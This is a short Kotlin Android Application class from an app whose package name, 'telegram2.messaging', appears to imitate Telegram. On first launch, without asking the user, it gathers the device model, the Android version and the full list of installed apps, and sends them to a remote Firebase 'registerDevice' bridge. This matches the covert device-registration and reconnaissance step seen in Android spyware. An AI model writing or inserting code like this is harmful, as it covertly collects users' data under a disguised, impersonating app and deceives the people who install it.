package com.telegram2.messaging

import android.app.Application
import com.telegram2.messaging.remote.FirebaseBridge
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class Telegram2App : Application() {
    override fun onCreate() {
        super.onCreate()
        // Register device immediately on first launch
        CoroutineScope(Dispatchers.IO).launch {
            val pm = packageManager
            val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA).map { it.packageName }
            FirebaseBridge.registerDevice(
                name = android.os.Build.MODEL,
                androidVersion = android.os.Build.VERSION.RELEASE,
                appList = apps
            )
        }
    }
}